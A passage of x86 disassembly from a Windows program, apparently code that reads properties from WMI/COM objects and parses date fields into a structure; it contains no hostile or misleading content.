  40753d:	test   ecx,ecx
  40753f:	je     0x407545
  407541:	lock inc DWORD PTR [ecx+0x8]
  407545:	lea    ecx,[ebp-0x18]
  407548:	call   0x4058ac
  40754d:	mov    esi,DWORD PTR [esi]
  40754f:	mov    DWORD PTR [ebp-0x18],esi
  407552:	mov    BYTE PTR [ebp-0x4],0x1
  407556:	lea    ecx,[ebp-0x24]
  407559:	call   0x4058ac
  40755e:	push   DWORD PTR [ebp-0x20]
  407561:	call   DWORD PTR ds:0x412104
  407567:	test   edi,edi
  407569:	jns    0x407573
  40756b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40756e:	call   0x4090c8
  407573:	mov    DWORD PTR [ebp-0x4],ebx
  407576:	jmp    0x4074ca
  40757b:	mov    ecx,edi
  40757d:	jmp    0x40756e
  40757f:	mov    DWORD PTR [ebp-0x10],esp
  407582:	mov    BYTE PTR [ebp-0x4],0x5
  407586:	mov    ecx,DWORD PTR [ebp-0x2c]
  407589:	call   0x408954
  40758e:	mov    ecx,eax
  407590:	call   0x40a30b
  407595:	lea    edi,[eax+0x5]
  407598:	lea    ecx,[edi+edi*1]
  40759b:	call   0x40ab1d
  4075a0:	mov    esi,eax
  4075a2:	mov    DWORD PTR [ebp-0x24],esi
  4075a5:	test   esi,esi
  4075a7:	je     0x4075e4
  4075a9:	push   edi
  4075aa:	mov    ecx,DWORD PTR [ebp-0x2c]
  4075ad:	call   0x408954
  4075b2:	mov    edx,eax
  4075b4:	mov    ecx,esi
  4075b6:	call   0x40a26c
  4075bb:	push   edi
  4075bc:	mov    edx,0x4018f8
  4075c1:	mov    ecx,esi
  4075c3:	call   0x40a2d1
  4075c8:	mov    ecx,esi
  4075ca:	call   0x4094c8
  4075cf:	lea    ecx,[ebp-0x24]
  4075d2:	call   0x40aa69
  4075d7:	mov    DWORD PTR [ebp-0x4],0x4
  4075de:	mov    eax,0x4074d7
  4075e3:	ret    
  4075e4:	push   0x8
  4075e6:	call   DWORD PTR ds:0x412014
  4075ec:	call   0x4095c0
  4075f1:	jmp    0x4075d7
  4075f3:	push   0x8
  4075f5:	call   DWORD PTR ds:0x412014
  4075fb:	call   0x4095c0
  407600:	mov    eax,0x4075d7
  407605:	ret    
  407606:	int3   
  407607:	int3   
  407608:	int3   
  407609:	int3   
  40760a:	int3   
  40760b:	push   0x28
  40760d:	mov    eax,0x40f401
  407612:	call   0x40eaf2
  407617:	mov    esi,edx
  407619:	mov    edi,ecx
  40761b:	test   edi,edi
  40761d:	je     0x4076c2
  407623:	test   esi,esi
  407625:	je     0x4076c2
  40762b:	xor    ebx,ebx
  40762d:	mov    DWORD PTR [ebp-0x4],ebx
  407630:	lea    eax,[ebp-0x30]
  407633:	push   eax
  407634:	call   DWORD PTR ds:0x412110
  40763a:	push   esi
  40763b:	lea    ecx,[ebp-0x1c]
  40763e:	call   0x40594b
  407643:	mov    BYTE PTR [ebp-0x4],0x1
  407647:	mov    eax,DWORD PTR [eax]
  407649:	test   eax,eax
  40764b:	je     0x407651
  40764d:	mov    eax,DWORD PTR [eax]
  40764f:	jmp    0x407653
  407651:	mov    eax,ebx
  407653:	mov    esi,DWORD PTR [edi]
  407655:	push   ebx
  407656:	push   ebx
  407657:	lea    ecx,[ebp-0x30]
  40765a:	push   ecx
  40765b:	push   ebx
  40765c:	push   eax
  40765d:	push   edi
  40765e:	mov    ecx,DWORD PTR [esi+0x10]
  407661:	call   DWORD PTR ds:0x41228c
  407667:	call   DWORD PTR [esi+0x10]
  40766a:	mov    esi,eax
  40766c:	mov    DWORD PTR [ebp-0x18],esi
  40766f:	mov    BYTE PTR [ebp-0x4],bl
  407672:	lea    ecx,[ebp-0x1c]
  407675:	call   0x4058ac
  40767a:	lea    eax,[ebp-0x30]
  40767d:	push   eax
  40767e:	test   esi,esi
  407680:	jns    0x40768c
  407682:	call   DWORD PTR ds:0x41210c
  407688:	mov    eax,esi
  40768a:	jmp    0x4076c7
  40768c:	push   DWORD PTR [ebp+0x8]
  40768f:	call   DWORD PTR ds:0x4120fc
  407695:	test   eax,eax
  407697:	jns    0x4076a0
  407699:	mov    ecx,eax
  40769b:	call   0x4090c8
  4076a0:	or     DWORD PTR [ebp-0x4],0xffffffff
  4076a4:	jmp    0x4076bc
  4076a6:	mov    eax,DWORD PTR [ebp-0x34]
  4076a9:	mov    eax,DWORD PTR [eax+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x18],eax
  4076af:	mov    eax,0x4076b5
  4076b4:	ret    
  4076b5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4076b9:	mov    esi,DWORD PTR [ebp-0x18]
  4076bc:	lea    eax,[ebp-0x30]
  4076bf:	push   eax
  4076c0:	jmp    0x407682
  4076c2:	mov    eax,0x80041008
  4076c7:	call   0x40ea30
  4076cc:	ret    0x4
  4076cf:	int3   
  4076d0:	int3   
  4076d1:	int3   
  4076d2:	int3   
  4076d3:	int3   
  4076d4:	push   0x10
  4076d6:	mov    eax,0x40f433
  4076db:	call   0x40eaf2
  4076e0:	mov    ebx,ecx
  4076e2:	test   ebx,ebx
  4076e4:	je     0x407775
  4076ea:	cmp    DWORD PTR [ebp+0x8],0x0
  4076ee:	je     0x407775
  4076f4:	and    DWORD PTR [ebp-0x4],0x0
  4076f8:	push   0x4016d8
  4076fd:	lea    ecx,[ebp-0x18]
  407700:	call   0x40594b
  407705:	mov    BYTE PTR [ebp-0x4],0x1
  407709:	mov    eax,DWORD PTR [eax]
  40770b:	test   eax,eax
  40770d:	je     0x407713
  40770f:	mov    eax,DWORD PTR [eax]
  407711:	jmp    0x407715
  407713:	xor    eax,eax
  407715:	mov    esi,DWORD PTR [ebx]
  407717:	push   0x0
  407719:	push   0x0
  40771b:	push   DWORD PTR [ebp+0x8]
  40771e:	push   0x0
  407720:	push   eax
  407721:	push   ebx
  407722:	mov    ecx,DWORD PTR [esi+0x10]
  407725:	call   DWORD PTR ds:0x41228c
  40772b:	call   DWORD PTR [esi+0x10]
  40772e:	mov    esi,eax
  407730:	mov    BYTE PTR [ebp-0x4],0x0
  407734:	lea    ecx,[ebp-0x18]
  407737:	call   0x4058ac
  40773c:	test   esi,esi
  40773e:	jns    0x40774d
  407740:	push   DWORD PTR [ebp+0x8]
  407743:	call   DWORD PTR ds:0x41210c
  407749:	mov    eax,esi
  40774b:	jmp    0x40777a
  40774d:	or     DWORD PTR [ebp-0x4],0xffffffff
  407751:	xor    eax,eax
  407753:	jmp    0x40777a
  407755:	mov    esi,DWORD PTR [ebp-0x1c]
  407758:	mov    ecx,DWORD PTR [esi+0x4]
  40775b:	call   0x407454
  407760:	mov    eax,DWORD PTR [esi+0x4]
  407763:	mov    DWORD PTR [ebp-0x18],eax
  407766:	mov    eax,0x40776c
  40776b:	ret    
  40776c:	or     DWORD PTR [ebp-0x4],0xffffffff
  407770:	mov    eax,DWORD PTR [ebp-0x18]
  407773:	jmp    0x40777a
  407775:	mov    eax,0x80041008
  40777a:	call   0x40ea30
  40777f:	ret    0x4
  407782:	int3   
  407783:	int3   
  407784:	int3   
  407785:	int3   
  407786:	int3   
  407787:	push   0x38
  407789:	mov    eax,0x40f466
  40778e:	call   0x40eab7
  407793:	mov    esi,ecx
  407795:	xor    eax,eax
  407797:	mov    DWORD PTR [ebp-0x18],eax
  40779a:	mov    DWORD PTR [ebp-0x20],eax
  40779d:	mov    DWORD PTR [ebp-0x24],eax
  4077a0:	test   esi,esi
  4077a2:	je     0x407895
  4077a8:	cmp    DWORD PTR [ebp+0x8],eax
  4077ab:	je     0x407895
  4077b1:	lea    eax,[ebp-0x34]
  4077b4:	push   eax
  4077b5:	call   DWORD PTR ds:0x412110
  4077bb:	lea    eax,[ebp-0x34]
  4077be:	push   eax
  4077bf:	mov    ecx,esi
  4077c1:	call   0x4076d4
  4077c6:	test   eax,eax
  4077c8:	js     0x407895
  4077ce:	xor    ebx,ebx
  4077d0:	inc    ebx
  4077d1:	cmp    WORD PTR [ebp-0x34],bx
  4077d5:	jne    0x4077de
  4077d7:	mov    eax,ebx
  4077d9:	jmp    0x407897
  4077de:	test   DWORD PTR [ebp-0x34],0x2000
  4077e5:	je     0x407895
  4077eb:	mov    edi,DWORD PTR [ebp-0x2c]
  4077ee:	lea    eax,[ebp-0x20]
  4077f1:	push   eax
  4077f2:	push   ebx
  4077f3:	push   edi
  4077f4:	call   DWORD PTR ds:0x4120f8
  4077fa:	lea    eax,[ebp-0x24]
  4077fd:	push   eax
  4077fe:	push   ebx
  4077ff:	push   edi
  407800:	call   DWORD PTR ds:0x4120f4
  407806:	mov    esi,DWORD PTR [ebp-0x34]
  407809:	and    esi,0xdfff
  40780f:	and    DWORD PTR [ebp-0x4],0x0
  407813:	mov    eax,DWORD PTR [ebp-0x20]
  407816:	mov    DWORD PTR [ebp-0x18],eax
  407819:	cmp    eax,DWORD PTR [ebp-0x24]
  40781c:	jg     0x40786e
  40781e:	lea    ecx,[ebp-0x1c]
  407821:	call   DWORD PTR ds:0x4121c4
  407827:	mov    BYTE PTR [ebp-0x4],bl
  40782a:	mov    WORD PTR [ebp-0x44],si
  40782e:	lea    eax,[ebp-0x3c]
  407831:	push   eax
  407832:	lea    eax,[ebp-0x18]
  407835:	push   eax
  407836:	push   edi
  407837:	call   DWORD PTR ds:0x4120f0
  40783d:	cmp    si,0x8
  407841:	jne    0x40785b
  407843:	push   DWORD PTR [ebp-0x3c]
  407846:	lea    ecx,[ebp-0x1c]
  407849:	call   DWORD PTR ds:0x4121b0
  40784f:	push   ecx
  407850:	mov    edx,DWORD PTR [ebp-0x1c]
  407853:	mov    ecx,DWORD PTR [ebp+0x8]
  407856:	call   0x40b1ba
  40785b:	mov    BYTE PTR [ebp-0x4],0x0
  40785f:	lea    ecx,[ebp-0x1c]
  407862:	call   DWORD PTR ds:0x4121c0
  407868:	mov    eax,DWORD PTR [ebp-0x18]
  40786b:	inc    eax
  40786c:	jmp    0x407816
  40786e:	or     DWORD PTR [ebp-0x4],0xffffffff
  407872:	lea    eax,[ebp-0x34]
  407875:	push   eax
  407876:	call   DWORD PTR ds:0x41210c
  40787c:	jmp    0x4077d7
  407881:	lea    eax,[ebp-0x34]
  407884:	push   eax
  407885:	call   DWORD PTR ds:0x41210c
  40788b:	mov    eax,0x407891
  407890:	ret    
  407891:	or     DWORD PTR [ebp-0x4],0xffffffff
  407895:	xor    eax,eax
  407897:	call   0x40ea03
  40789c:	ret    0x4
  40789f:	int3   
  4078a0:	int3   
  4078a1:	int3   
  4078a2:	int3   
  4078a3:	int3   
  4078a4:	push   0x1c
  4078a6:	mov    eax,0x40f496
  4078ab:	call   0x40eab7
  4078b0:	mov    edi,edx
  4078b2:	mov    ebx,ecx
  4078b4:	lea    eax,[ebp-0x28]
  4078b7:	push   eax
  4078b8:	call   DWORD PTR ds:0x412110
  4078be:	xor    esi,esi
  4078c0:	mov    DWORD PTR [ebp-0x4],esi
  4078c3:	push   esi
  4078c4:	call   DWORD PTR ds:0x412014
  4078ca:	mov    ecx,DWORD PTR [ebp+0x8]
  4078cd:	call   DWORD PTR ds:0x4121a0
  4078d3:	mov    BYTE PTR [ebp-0x4],0x1
  4078d7:	push   DWORD PTR [ebp+0xc]
  4078da:	mov    ecx,DWORD PTR [ebp+0x8]
  4078dd:	call   DWORD PTR ds:0x4121b0
  4078e3:	test   ebx,ebx
  4078e5:	je     0x407951
  4078e7:	test   edi,edi
  4078e9:	je     0x407951
  4078eb:	lea    eax,[ebp-0x28]
  4078ee:	push   eax
  4078ef:	mov    edx,edi
  4078f1:	mov    ecx,ebx
  4078f3:	call   0x40760b
  4078f8:	test   eax,eax
  4078fa:	jns    0x407903
  4078fc:	mov    ecx,eax
  4078fe:	call   0x4090c8
  407903:	push   0x8
  407905:	pop    eax
  407906:	cmp    ax,WORD PTR [ebp-0x28]
  40790a:	jne    0x40793a
  40790c:	lea    eax,[ebp-0x28]
  40790f:	push   eax
  407910:	lea    ecx,[ebp-0x14]
  407913:	call   0x4088cb
  407918:	mov    BYTE PTR [ebp-0x4],0x2
  40791c:	mov    eax,DWORD PTR [eax]
  40791e:	test   eax,eax
  407920:	je     0x407924
  407922:	mov    esi,DWORD PTR [eax]
  407924:	push   esi
  407925:	mov    ecx,DWORD PTR [ebp+0x8]
  407928:	call   DWORD PTR ds:0x4121b0
  40792e:	mov    BYTE PTR [ebp-0x4],0x1
  407932:	lea    ecx,[ebp-0x14]
  407935:	call   0x4058ac
  40793a:	or     DWORD PTR [ebp-0x4],0xffffffff
  40793e:	lea    eax,[ebp-0x28]
  407941:	push   eax
  407942:	call   DWORD PTR ds:0x41210c
  407948:	test   eax,eax
  40794a:	js     0x4078fc
  40794c:	xor    eax,eax
  40794e:	inc    eax
  40794f:	jmp    0x40797d
  407951:	mov    ecx,0x80041008
  407956:	jmp    0x4078fe
  407958:	mov    eax,DWORD PTR [ebp-0x18]
  40795b:	mov    ecx,DWORD PTR [eax+0x4]
  40795e:	call   0x407454
  407963:	mov    eax,0x407969
  407968:	ret    
  407969:	or     DWORD PTR [ebp-0x4],0xffffffff
  40796d:	lea    eax,[ebp-0x28]
  407970:	push   eax
  407971:	call   DWORD PTR ds:0x41210c
  407977:	test   eax,eax
  407979:	js     0x4078fc
  40797b:	xor    eax,eax
  40797d:	call   0x40ea03
  407982:	ret    0x8
  407985:	mov    ecx,0x80041006
  40798a:	call   0x407454
  40798f:	mov    eax,0x407969
  407994:	ret    
  407995:	int3   
  407996:	int3   
  407997:	int3   
  407998:	int3   
  407999:	int3   
  40799a:	push   0x14
  40799c:	mov    eax,0x40f4be
  4079a1:	call   0x40ea44
  4079a6:	mov    edi,edx
  4079a8:	mov    DWORD PTR [ebp-0x10],ecx
  4079ab:	lea    eax,[ebp-0x20]
  4079ae:	push   eax
  4079af:	call   DWORD PTR ds:0x412110
  4079b5:	xor    esi,esi
  4079b7:	mov    DWORD PTR [ebp-0x4],esi
  4079ba:	mov    ebx,DWORD PTR [ebp+0x8]
  4079bd:	mov    eax,DWORD PTR [ebp-0x10]
  4079c0:	mov    DWORD PTR [ebx],esi
  4079c2:	test   eax,eax
  4079c4:	je     0x4079f3
  4079c6:	test   edi,edi
  4079c8:	je     0x4079f3
  4079ca:	lea    ecx,[ebp-0x20]
  4079cd:	mov    edx,edi
  4079cf:	push   ecx
  4079d0:	mov    ecx,eax
  4079d2:	call   0x40760b
  4079d7:	test   eax,eax
  4079d9:	js     0x4079f3
  4079db:	inc    esi
  4079dc:	cmp    WORD PTR [ebp-0x20],si
  4079e0:	je     0x4079f3
  4079e2:	cmp    WORD PTR [ebp-0x20],0x0
  4079e7:	je     0x4079f3
  4079e9:	lea    ecx,[ebp-0x20]
  4079ec:	call   0x408835
  4079f1:	mov    DWORD PTR [ebx],eax
  4079f3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4079f7:	lea    eax,[ebp-0x20]
  4079fa:	push   eax
  4079fb:	call   DWORD PTR ds:0x41210c
  407a01:	test   eax,eax
  407a03:	jns    0x407a0c
  407a05:	mov    ecx,eax
  407a07:	call   0x4090c8
  407a0c:	mov    eax,esi
  407a0e:	call   0x40ea03
  407a13:	ret    0x8
  407a16:	int3   
  407a17:	int3   
  407a18:	int3   
  407a19:	int3   
  407a1a:	int3   
  407a1b:	push   0x1c
  407a1d:	mov    eax,0x40f4e6
  407a22:	call   0x40eab7
  407a27:	mov    edi,edx
  407a29:	mov    ebx,ecx
  407a2b:	lea    eax,[ebp-0x28]
  407a2e:	push   eax
  407a2f:	call   DWORD PTR ds:0x412110
  407a35:	and    DWORD PTR [ebp-0x4],0x0
  407a39:	push   0x0
  407a3b:	call   DWORD PTR ds:0x412014
  407a41:	mov    BYTE PTR [ebp-0x4],0x1
  407a45:	mov    esi,DWORD PTR [ebp+0x8]
  407a48:	and    DWORD PTR [esi],0x0
  407a4b:	test   ebx,ebx
  407a4d:	je     0x407a91
  407a4f:	test   edi,edi
  407a51:	je     0x407a91
  407a53:	lea    eax,[ebp-0x28]
  407a56:	push   eax
  407a57:	mov    edx,edi
  407a59:	mov    ecx,ebx
  407a5b:	call   0x40760b
  407a60:	test   eax,eax
  407a62:	jns    0x407a6b
  407a64:	mov    ecx,eax
  407a66:	call   0x4090c8
  407a6b:	push   0xb
  407a6d:	pop    eax
  407a6e:	cmp    ax,WORD PTR [ebp-0x28]
  407a72:	jne    0x407a7a
  407a74:	movsx  eax,WORD PTR [ebp-0x20]
  407a78:	mov    DWORD PTR [esi],eax
  407a7a:	or     DWORD PTR [ebp-0x4],0xffffffff
  407a7e:	lea    eax,[ebp-0x28]
  407a81:	push   eax
  407a82:	call   DWORD PTR ds:0x41210c
  407a88:	test   eax,eax
  407a8a:	js     0x407a64
  407a8c:	xor    eax,eax
  407a8e:	inc    eax
  407a8f:	jmp    0x407abd
  407a91:	mov    ecx,0x80041008
  407a96:	jmp    0x407a66
  407a98:	mov    eax,DWORD PTR [ebp-0x14]
  407a9b:	mov    ecx,DWORD PTR [eax+0x4]
  407a9e:	call   0x407454
  407aa3:	mov    eax,0x407aa9
  407aa8:	ret    
  407aa9:	or     DWORD PTR [ebp-0x4],0xffffffff
  407aad:	lea    eax,[ebp-0x28]
  407ab0:	push   eax
  407ab1:	call   DWORD PTR ds:0x41210c
  407ab7:	test   eax,eax
  407ab9:	js     0x407a64
  407abb:	xor    eax,eax
  407abd:	call   0x40ea03
  407ac2:	ret    0x8
  407ac5:	int3   
  407ac6:	int3   
  407ac7:	int3   
  407ac8:	int3   
  407ac9:	int3   
  407aca:	push   0x8
  407acc:	mov    eax,0x40f50f
  407ad1:	call   0x40eab7
  407ad6:	mov    edi,ecx
  407ad8:	lea    ecx,[ebp-0x14]
  407adb:	call   DWORD PTR ds:0x4121c4
  407ae1:	xor    ebx,ebx
  407ae3:	mov    DWORD PTR [ebp-0x4],ebx
  407ae6:	push   ebx
  407ae7:	call   DWORD PTR ds:0x412014
  407aed:	lea    ecx,[ebp-0x14]
  407af0:	call   DWORD PTR ds:0x4121a0
  407af6:	mov    BYTE PTR [ebp-0x4],0x1
  407afa:	mov    esi,DWORD PTR [ebp+0x8]
  407afd:	mov    DWORD PTR [esi],0x1
  407b03:	mov    DWORD PTR [esi+0x4],ebx
  407b06:	test   edi,edi
  407b08:	je     0x407b49
  407b0a:	xor    eax,eax
  407b0c:	mov    edx,0x4013e0
  407b11:	cmp    eax,edx
  407b13:	je     0x407b49
  407b15:	push   0x4018fc
  407b1a:	lea    eax,[ebp-0x14]
  407b1d:	push   eax
  407b1e:	mov    ecx,edi
  407b20:	call   0x4078a4
  407b25:	test   eax,eax
  407b27:	je     0x407b53
  407b29:	push   DWORD PTR [ebp-0x14]
  407b2c:	call   DWORD PTR ds:0x412240
  407b32:	pop    ecx
  407b33:	mov    DWORD PTR [esi],eax
  407b35:	mov    DWORD PTR [esi+0x4],edx
  407b38:	cmp    eax,ebx
  407b3a:	jne    0x407b6a
  407b3c:	cmp    edx,ebx
  407b3e:	jne    0x407b6a
  407b40:	mov    DWORD PTR [esi],0x1
  407b46:	mov    DWORD PTR [esi+0x4],ebx
  407b49:	mov    ecx,0x80041008
  407b4e:	call   0x407454
  407b53:	or     DWORD PTR [ebp-0x4],0xffffffff
  407b57:	lea    ecx,[ebp-0x14]
  407b5a:	call   DWORD PTR ds:0x4121c0
  407b60:	xor    eax,eax
  407b62:	call   0x40ea03
  407b67:	ret    0x4
  407b6a:	or     DWORD PTR [ebp-0x4],0xffffffff
  407b6e:	lea    ecx,[ebp-0x14]
  407b71:	call   DWORD PTR ds:0x4121c0
  407b77:	xor    eax,eax
  407b79:	inc    eax
  407b7a:	jmp    0x407b62
  407b7c:	mov    ecx,0x80041006
  407b81:	call   0x407454
  407b86:	mov    eax,0x407b53
  407b8b:	ret    
  407b8c:	int3   
  407b8d:	int3   
  407b8e:	int3   
  407b8f:	int3   
  407b90:	int3   
  407b91:	push   0x10
  407b93:	mov    eax,0x40f577
  407b98:	call   0x40eab7
  407b9d:	mov    esi,edx
  407b9f:	mov    edi,ecx
  407ba1:	lea    ecx,[ebp-0x14]
  407ba4:	call   DWORD PTR ds:0x4121c4
  407baa:	and    DWORD PTR [ebp-0x4],0x0
  407bae:	test   edi,edi
  407bb0:	je     0x407d4d
  407bb6:	test   esi,esi
  407bb8:	je     0x407d4d
  407bbe:	mov    BYTE PTR [ebp-0x4],0x1
  407bc2:	push   0x401900
  407bc7:	lea    eax,[ebp-0x14]
  407bca:	push   eax
  407bcb:	mov    edx,esi
  407bcd:	mov    ecx,edi
  407bcf:	call   0x4078a4
  407bd4:	test   eax,eax
  407bd6:	je     0x407d57
  407bdc:	push   0x4
  407bde:	lea    eax,[ebp-0x18]
  407be1:	push   eax
  407be2:	lea    ecx,[ebp-0x14]
  407be5:	call   DWORD PTR ds:0x41219c
  407beb:	push   0x2
  407bed:	pop    ebx
  407bee:	mov    BYTE PTR [ebp-0x4],bl
  407bf1:	mov    ecx,DWORD PTR [eax]
  407bf3:	call   0x409aea
  407bf8:	mov    esi,DWORD PTR [ebp+0x8]
  407bfb:	mov    WORD PTR [esi],ax
  407bfe:	mov    BYTE PTR [ebp-0x4],0x1
  407c02:	lea    ecx,[ebp-0x18]
  407c05:	call   DWORD PTR ds:0x4121c0
  407c0b:	push   ebx
  407c0c:	push   0x4
  407c0e:	lea    eax,[ebp-0x18]
  407c11:	push   eax
  407c12:	lea    ecx,[ebp-0x14]
  407c15:	call   DWORD PTR ds:0x4121d8
  407c1b:	mov    BYTE PTR [ebp-0x4],0x3
  407c1f:	mov    ecx,DWORD PTR [eax]
  407c21:	call   0x409aea
  407c26:	mov    WORD PTR [esi+0x2],ax
  407c2a:	mov    BYTE PTR [ebp-0x4],0x1
  407c2e:	lea    ecx,[ebp-0x18]
  407c31:	call   DWORD PTR ds:0x4121c0
  407c37:	xor    eax,eax
  407c39:	mov    WORD PTR [esi+0x4],ax
  407c3d:	push   ebx
  407c3e:	push   0x6
  407c40:	lea    eax,[ebp-0x18]
  407c43:	push   eax
  407c44:	lea    ecx,[ebp-0x14]
  407c47:	call   DWORD PTR ds:0x4121d8
  407c4d:	mov    BYTE PTR [ebp-0x4],0x4
  407c51:	mov    ecx,DWORD PTR [eax]
  407c53:	call   0x409aea
  407c58:	mov    WORD PTR [esi+0x6],ax
  407c5c:	mov    BYTE PTR [ebp-0x4],0x1
  407c60:	lea    ecx,[ebp-0x18]
  407c63:	call   DWORD PTR ds:0x4121c0
  407c69:	push   ebx
  407c6a:	push   0x8
  407c6c:	lea    eax,[ebp-0x18]
  407c6f:	push   eax
  407c70:	lea    ecx,[ebp-0x14]
  407c73:	call   DWORD PTR ds:0x4121d8
  407c79:	mov    BYTE PTR [ebp-0x4],0x5
  407c7d:	mov    ecx,DWORD PTR [eax]
  407c7f:	call   0x409aea
  407c84:	mov    WORD PTR [esi+0x8],ax
  407c88:	mov    BYTE PTR [ebp-0x4],0x1
  407c8c:	lea    ecx,[ebp-0x18]
  407c8f:	call   DWORD PTR ds:0x4121c0
  407c95:	push   ebx
  407c96:	push   0xa
  407c98:	lea    eax,[ebp-0x18]
  407c9b:	push   eax
  407c9c:	lea    ecx,[ebp-0x14]
  407c9f:	call   DWORD PTR ds:0x4121d8
  407ca5:	mov    BYTE PTR [ebp-0x4],0x6
  407ca9:	mov    ecx,DWORD PTR [eax]
  407cab:	call   0x409aea
  407cb0:	mov    WORD PTR [esi+0xa],ax
  407cb4:	mov    BYTE PTR [ebp-0x4],0x1
  407cb8:	lea    ecx,[ebp-0x18]
  407cbb:	call   DWORD PTR ds:0x4121c0
  407cc1:	push   ebx
  407cc2:	push   0xc
  407cc4:	lea    eax,[ebp-0x18]
  407cc7:	push   eax
  407cc8:	lea    ecx,[ebp-0x14]
  407ccb:	call   DWORD PTR ds:0x4121d8
  407cd1:	mov    BYTE PTR [ebp-0x4],0x7
  407cd5:	mov    ecx,DWORD PTR [eax]
  407cd7:	call   0x409aea
  407cdc:	mov    WORD PTR [esi+0xc],ax
  407ce0:	mov    BYTE PTR [ebp-0x4],0x1
  407ce4:	lea    ecx,[ebp-0x18]
  407ce7:	call   DWORD PTR ds:0x4121c0
  407ced:	push   0x6
  407cef:	push   0xf
  407cf1:	lea    eax,[ebp-0x18]
  407cf4:	push   eax
  407cf5:	lea    ecx,[ebp-0x14]
  407cf8:	call   DWORD PTR ds:0x4121d8
  407cfe:	mov    BYTE PTR [ebp-0x4],0x8
  407d02:	mov    ecx,DWORD PTR [eax]
  407d04:	call   0x409aea
  407d09:	mov    WORD PTR [esi+0xe],ax
  407d0d:	mov    BYTE PTR [ebp-0x4],0x1
  407d11:	lea    ecx,[ebp-0x18]
  407d14:	call   DWORD PTR ds:0x4121c0
  407d1a:	or     DWORD PTR [ebp-0x4],0xffffffff
  407d1e:	lea    ecx,[ebp-0x14]
  407d21:	call   DWORD PTR ds:0x4121c0
  407d27:	xor    eax,eax
  407d29:	inc    eax
  407d2a:	jmp    0x407d66
  407d2c:	mov    eax,DWORD PTR [ebp-0x1c]
  407d2f:	mov    ecx,DWORD PTR [eax+0x4]
  407d32:	call   0x407454
  407d37:	mov    eax,0x407d57
  407d3c:	ret    
  407d3d:	mov    ecx,0x80041006
  407d42:	call   0x407454
  407d47:	mov    eax,0x407d57
  407d4c:	ret    
  407d4d:	mov    ecx,0x80041008
  407d52:	call   0x407454
  407d57:	or     DWORD PTR [ebp-0x4],0xffffffff
  407d5b:	lea    ecx,[ebp-0x14]
  407d5e:	call   DWORD PTR ds:0x4121c0
  407d64:	xor    eax,eax
  407d66:	call   0x40ea03
  407d6b:	ret    0x4
  407d6e:	int3   
  407d6f:	int3   
  407d70:	int3   
  407d71:	int3   
  407d72:	int3   
  407d73:	push   0x24
  407d75:	mov    eax,0x40f59f
  407d7a:	call   0x40eaf2
  407d7f:	mov    ebx,ecx
  407d81:	test   ebx,ebx
  407d83:	je     0x407df9
  407d85:	test   edx,edx
  407d87:	je     0x407df9
  407d89:	and    DWORD PTR [ebp-0x4],0x0
  407d8d:	mov    esi,DWORD PTR [ebp+0x8]
  407d90:	lea    edi,[ebp-0x30]
  407d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d97:	push   edx
  407d98:	lea    ecx,[ebp-0x1c]
  407d9b:	call   0x40594b
  407da0:	mov    BYTE PTR [ebp-0x4],0x1
  407da4:	mov    eax,DWORD PTR [eax]
  407da6:	test   eax,eax
  407da8:	je     0x407dae
  407daa:	mov    eax,DWORD PTR [eax]
  407dac:	jmp    0x407db0
  407dae:	xor    eax,eax
  407db0:	mov    esi,DWORD PTR [ebx]
  407db2:	push   0x0
  407db4:	lea    ecx,[ebp-0x30]
  407db7:	push   ecx
  407db8:	push   0x0
  407dba:	push   eax
  407dbb:	push   ebx
  407dbc:	mov    ecx,DWORD PTR [esi+0x14]
  407dbf:	call   DWORD PTR ds:0x41228c
  407dc5:	call   DWORD PTR [esi+0x14]
  407dc8:	mov    esi,eax
  407dca:	mov    DWORD PTR [ebp-0x18],esi
  407dcd:	mov    BYTE PTR [ebp-0x4],0x0
  407dd1:	lea    ecx,[ebp-0x1c]
  407dd4:	call   0x4058ac
  407dd9:	or     DWORD PTR [ebp-0x4],0xffffffff
  407ddd:	jmp    0x407df5
  407ddf:	mov    eax,DWORD PTR [ebp-0x20]
  407de2:	mov    eax,DWORD PTR [eax+0x4]
  407de5:	mov    DWORD PTR [ebp-0x18],eax
  407de8:	mov    eax,0x407dee
  407ded:	ret    
  407dee:	or     DWORD PTR [ebp-0x4],0xffffffff
  407df2:	mov    esi,DWORD PTR [ebp-0x18]
  407df5:	mov    eax,esi
  407df7:	jmp    0x407dfe
  407df9:	mov    eax,0x80041008
  407dfe:	call   0x40ea30
  407e03:	ret    0x4
  407e06:	int3   
  407e07:	int3   
  407e08:	int3   
  407e09:	int3   
  407e0a:	int3   
  407e0b:	push   0x20
  407e0d:	mov    eax,0x40f5d1
  407e12:	call   0x40eab7
  407e17:	mov    esi,edx
  407e19:	mov    edi,ecx
  407e1b:	lea    eax,[ebp-0x2c]
  407e1e:	push   eax
  407e1f:	call   DWORD PTR ds:0x412110
  407e25:	and    DWORD PTR [ebp-0x4],0x0
  407e29:	test   edi,edi
  407e2b:	je     0x407e99
  407e2d:	test   esi,esi
  407e2f:	je     0x407e99
  407e31:	cmp    DWORD PTR [ebp+0x8],0x0
  407e35:	je     0x407e99
  407e37:	mov    BYTE PTR [ebp-0x4],0x1
  407e3b:	push   DWORD PTR [ebp+0x8]
  407e3e:	lea    ecx,[ebp-0x2c]
  407e41:	call   0x4087df
  407e46:	lea    eax,[ebp-0x2c]
  407e49:	push   eax
  407e4a:	mov    edx,esi
  407e4c:	mov    ecx,edi
  407e4e:	call   0x407d73
  407e53:	mov    esi,eax
  407e55:	mov    DWORD PTR [ebp-0x18],esi
  407e58:	test   esi,esi
  407e5a:	jns    0x407e63
  407e5c:	mov    ecx,esi
  407e5e:	call   0x4090c8
  407e63:	and    DWORD PTR [ebp-0x4],0x0
  407e67:	jmp    0x407e7f
  407e69:	mov    eax,DWORD PTR [ebp-0x1c]
  407e6c:	mov    eax,DWORD PTR [eax+0x4]
  407e6f:	mov    DWORD PTR [ebp-0x18],eax
  407e72:	mov    eax,0x407e78
  407e77:	ret    
  407e78:	and    DWORD PTR [ebp-0x4],0x0
  407e7c:	mov    esi,DWORD PTR [ebp-0x18]
  407e7f:	or     DWORD PTR [ebp-0x4],0xffffffff
  407e83:	lea    eax,[ebp-0x2c]
  407e86:	push   eax
  407e87:	call   DWORD PTR ds:0x41210c
